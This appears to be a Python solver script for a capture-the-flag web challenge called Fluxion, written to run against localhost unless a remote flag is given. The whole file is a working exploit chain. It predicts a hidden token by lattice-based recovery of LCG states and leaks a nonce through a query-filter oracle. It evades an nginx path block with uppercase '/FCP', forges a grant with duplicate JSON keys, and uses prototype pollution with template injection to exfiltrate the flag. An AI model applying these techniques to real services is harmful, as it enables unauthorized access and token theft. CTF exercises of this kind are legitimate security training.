#!/usr/bin/env python3
"""Solver for Fluxion (loopback by default; remote requires --allow-remote)."""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import os
import re
import struct
import sys
import time
import zlib
from concurrent.futures import ThreadPoolExecutor
from fractions import Fraction
from urllib.parse import urlparse

import requests
from fpylll import IntegerMatrix, LLL

MOD = 1 << 64
OUTPUT_SHIFT = 40
OUTPUT_MASK = (1 << 24) - 1
LCG_A = 6364136223846793005
LCG_C = 1442695040888963407
MAGIC = b"FX"
VERSION = 1
HDR = 13
FLAG_FINAL = 1
T_HELLO, T_KEX, T_TICK, T_ARM = 0x01, 0x02, 0x04, 0x03
T_CHALLENGE, T_KEXOK, T_TOCK, T_ARMED, T_ERR = 0x81, 0x82, 0x84, 0x83, 0xEE


def b64u_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def b64u_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


class Rpc:
    def __init__(self, base_url: str):
        self.url = base_url.rstrip("/") + "/api/rpc"
        self.http = requests.Session()

    def call(self, method: str, params: dict | None = None):
        response = self.http.post(self.url, json={"method": method, "params": params or {}}, timeout=10)
        response.raise_for_status()
        body = response.json()
        if "error" in body:
            raise RuntimeError(f"{method}: {body['error']}")
        result = body.get("result")
        if isinstance(result, dict) and result.get("error"):
            raise RuntimeError(f"{method}: {result['error']}")
        return result


def recover_states(outputs: list[int]) -> list[int]:
    """Recover full states from consecutive 24-bit MSB outputs using LLL."""
    if len(outputs) < 3:
        raise ValueError("at least three outputs are required")
    delta = LCG_C % MOD
    shifted = []
    for output in outputs:
        shifted.append((output << OUTPUT_SHIFT) - delta)
        delta = (LCG_A * delta + LCG_C) % MOD

    n = len(outputs)
    basis = IntegerMatrix(n, n)
    basis[0, 0] = MOD
    for i in range(1, n):
        basis[i, 0] = LCG_A ** i
        basis[i, i] = -1
    LLL.reduction(basis)
    mat = [[int(basis[i, j]) for j in range(n)] for i in range(n)]
    product = [sum(mat[i][j] * shifted[j] for j in range(n)) for i in range(n)]
    nearest = [((v + MOD // 2) // MOD) * MOD - v for v in product]

    # Exact Gaussian elimination; LLL preserves an integral solution here.
    aug = [[Fraction(v) for v in row] + [Fraction(rhs)] for row, rhs in zip(mat, nearest)]
    for col in range(n):
        pivot = next((row for row in range(col, n) if aug[row][col]), None)
        if pivot is None:
            raise ValueError("singular LCG lattice")
        aug[col], aug[pivot] = aug[pivot], aug[col]
        scale = aug[col][col]
        aug[col] = [v / scale for v in aug[col]]
        for row in range(n):
            if row == col or not aug[row][col]:
                continue
            factor = aug[row][col]
            aug[row] = [a - factor * b for a, b in zip(aug[row], aug[col])]
    correction = [aug[i][-1] for i in range(n)]
    if any(value.denominator != 1 for value in correction):
        raise ValueError("LCG lattice did not produce an integral solution")

    delta = LCG_C % MOD
    states = []
    for i, (value, adjust) in enumerate(zip(shifted, correction)):
        state = int(value + adjust + delta)
        if not 0 <= state < MOD or (state >> OUTPUT_SHIFT) != outputs[i]:
            raise ValueError("recovered state failed output verification")
        states.append(state)
        delta = (LCG_A * delta + LCG_C) % MOD
    if any((LCG_A * left + LCG_C) % MOD != right for left, right in zip(states, states[1:])):
        raise ValueError("recovered states are not an LCG sequence")
    return states


def frame(frame_type: int, payload: bytes = b"", *, flags: int = 0, seq: int = 0, sid: int = 0) -> bytes:
    header = MAGIC + bytes((VERSION, frame_type, flags, seq & 0xFF))
    header += struct.pack(">I", sid & 0xFFFFFFFF) + len(payload).to_bytes(3, "big")
    body = header + payload
    return body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)


def parse_frame(data: bytes) -> dict:
    if len(data) < HDR + 4 or data[:3] != MAGIC + bytes((VERSION,)):
        raise RuntimeError("invalid FCP response frame")
    length = int.from_bytes(data[10:13], "big")
    if len(data) != HDR + length + 4:
        raise RuntimeError("truncated FCP response frame")
    if zlib.crc32(data[:HDR + length]) & 0xFFFFFFFF != int.from_bytes(data[-4:], "big"):
        raise RuntimeError("bad FCP response CRC")
    return {"type": data[3], "flags": data[4], "seq": data[5], "sid": int.from_bytes(data[6:10], "big"),
            "payload": data[HDR:HDR + length], "raw": data}


class Fcp:
    def __init__(self, base_url: str):
        # The deployed nginx denies the literal lowercase /fcp path. Express' router
        # is case-insensitive, so /FCP reaches the same control endpoint.
        self.url = base_url.rstrip("/") + "/FCP"
        self.http = requests.Session()

    def post(self, raw: bytes) -> dict:
        response = self.http.post(self.url, data=raw,
                                  headers={"content-type": "application/octet-stream"}, timeout=15)
        response.raise_for_status()
        return parse_frame(response.content)

    def arm(self, enrollment: str, run_id: str, nonce: str) -> str:
        hello = frame(T_HELLO, enrollment.encode())
        challenge = self.post(hello)
        if challenge["type"] != T_CHALLENGE or len(challenge["payload"]) < 8:
            raise RuntimeError(f"HELLO failed: {challenge['payload'].decode(errors='replace')}")
        sid, salt = challenge["sid"], challenge["payload"][:8]
        key = hmac.new(nonce.encode(), salt, hashlib.sha256).digest()[:16]
        transcript = hello + challenge["raw"]
        kex = frame(T_KEX, hmac.new(key, transcript, hashlib.sha256).digest()[:8], seq=1, sid=sid)
        kexok = self.post(kex)
        if kexok["type"] != T_KEXOK:
            raise RuntimeError(f"KEX failed: {kexok['payload'].decode(errors='replace')}")
        transcript += kex + kexok["raw"]

        seq, chain = 2, kexok["payload"][:8]
        while True:
            rung = hmac.new(key, b"FXTICK" + chain + bytes((seq - 2,)), hashlib.sha256).digest()[:8]
            tick = frame(T_TICK, rung, seq=seq, sid=sid)
            reply = self.post(tick)
            if reply["type"] == T_ERR:
                error = reply["payload"].decode(errors="replace")
                if error.startswith("E_TOO_SOON:"):
                    try:
                        time.sleep(max(0, int(error.split(":", 1)[1])) / 1000 + 0.005)
                    except ValueError:
                        time.sleep(0.05)
                    continue
                if error == "E_STAGE":
                    return self._arm_without_ladder(enrollment, run_id, nonce)
                raise RuntimeError(f"TICK failed: {error}")
            if reply["type"] != T_TOCK or len(reply["payload"]) < 14:
                raise RuntimeError("invalid TOCK response")
            remaining, chain = int.from_bytes(reply["payload"][:2], "big"), reply["payload"][6:14]
            seq += 1
            if remaining <= 0:
                break

        run_bytes = run_id.encode()
        tag = hmac.new(key, transcript + run_bytes, hashlib.sha256).digest()[:16]
        armed = self.post(frame(T_ARM, run_bytes + tag, flags=FLAG_FINAL, seq=seq, sid=sid))
        if armed["type"] != T_ARMED:
            raise RuntimeError(f"ARM failed: {armed['payload'].decode(errors='replace')}")
        return armed["payload"].decode()

    def _arm_without_ladder(self, enrollment: str, run_id: str, nonce: str) -> str:
        hello = frame(T_HELLO, enrollment.encode())
        challenge = self.post(hello)
        sid = challenge["sid"]
        key = hmac.new(nonce.encode(), challenge["payload"][:8], hashlib.sha256).digest()[:16]
        transcript = hello + challenge["raw"]
        kex = frame(T_KEX, hmac.new(key, transcript, hashlib.sha256).digest()[:8], seq=1, sid=sid)
        kexok = self.post(kex)
        if kexok["type"] != T_KEXOK:
            raise RuntimeError("KEX retry failed")
        transcript += kex + kexok["raw"]
        run_bytes = run_id.encode()
        tag = hmac.new(key, transcript + run_bytes, hashlib.sha256).digest()[:16]
        armed = self.post(frame(T_ARM, run_bytes + tag, flags=FLAG_FINAL, seq=2, sid=sid))
        if armed["type"] != T_ARMED:
            raise RuntimeError(f"ARM failed: {armed['payload'].decode(errors='replace')}")
        return armed["payload"].decode()


def local_url(value: str) -> str:
    parsed, host = urlparse(value), urlparse(value).hostname
    if parsed.scheme not in {"http", "https"} or (host or "").lower() not in {"127.0.0.1", "localhost", "::1"}:
        raise ValueError("local-only solver: URL must point to localhost")
    return value.rstrip("/")


def leak_nonce(rpc: Rpc) -> str:
    alphabet, prefix = "0123456789abcdef", ""
    for _ in range(16):
        def probe(ch: str):
            result = rpc.call("searchRuns", {"filter": {"workflowName": "admin-provision-approval",
                    "approvalNonce": {"$startsWith": prefix + ch}}})
            return ch, result.get("count", 0) == 1
        with ThreadPoolExecutor(max_workers=16) as pool:
            matches = [ch for ch, ok in pool.map(probe, alphabet) if ok]
        if len(matches) != 1:
            raise RuntimeError(f"nonce oracle returned {matches!r} for prefix {prefix!r}")
        prefix += matches[0]
        print(f"    nonce {prefix}", flush=True)
    return prefix


def solve(target: str) -> str:
    rpc = Rpc(target)
    runs = rpc.call("fetchRuns")
    privileged = next((r for r in runs if r.get("workflowName") == "admin-provision-approval"), None)
    if not privileged:
        raise RuntimeError("privileged run not found")
    run_id = privileged["runId"]
    print(f"[*] target run: {run_id}")
    nonce = leak_nonce(rpc)
    print(f"[*] approval nonce: {nonce}")

    events = rpc.call("fetchEvents", {"runId": run_id})["events"]
    outputs = [int.from_bytes(b64u_decode(event["stepId"]), "big") & OUTPUT_MASK for event in events]
    states = recover_states(outputs)
    hook_state = (LCG_A * states[-1] + LCG_C) % MOD
    hook_token = b64u_encode(hook_state.to_bytes(8, "big"))
    print(f"[*] predicted private hook: {hook_token}")

    enrollment = rpc.call("enrollDevice", {"profile": {"tier": "operator"}})["enrollment"]
    arm_token = Fcp(target).arm(enrollment, run_id, nonce)
    print("[*] FCP arming complete")
    document = (f'{{"act":"preview","act":"resume","aud":"approvals",'
                f'"runId":"{run_id}","nonce":"{nonce}"}}')
    grant = rpc.call("previewApprovalGrant", {"document": document})["grant"]
    resumed = rpc.call("resumeHook", {"token": hook_token, "grant": grant,
                                       "armToken": arm_token, "payload": {"approved": True}})
    if resumed.get("status") != "completed":
        raise RuntimeError(f"resume failed: {resumed}")

    prefs = {"constructor": {"prototype": {"presentation": {
        "token": nonce, "caption": "${engine.runs." + run_id + "._flag}"}}}}
    rpc.call("saveViewPreferences", {"prefs": prefs})
    report = rpc.call("renderRunReport", {"runId": run_id})
    match = re.search(r"(TFC\{[^}]+\})", report.get("diagnostic", ""))
    if not match:
        raise RuntimeError(f"flag was not reflected: {report}")
    return match.group(1)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=os.environ.get("FLUXION_URL", "http://127.0.0.1:8001"))
    parser.add_argument("--allow-remote", action="store_true",
                        help="explicitly allow a non-loopback target for a live challenge")
    args = parser.parse_args()
    try:
        target = args.url.rstrip("/") if args.allow_remote else local_url(args.url)
        print(f"[*] Attacking {'target' if args.allow_remote else 'local Fluxion'} at {target}")
        print(f"[+] FLAG: {solve(target)}")
        return 0
    except (requests.RequestException, RuntimeError, ValueError) as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
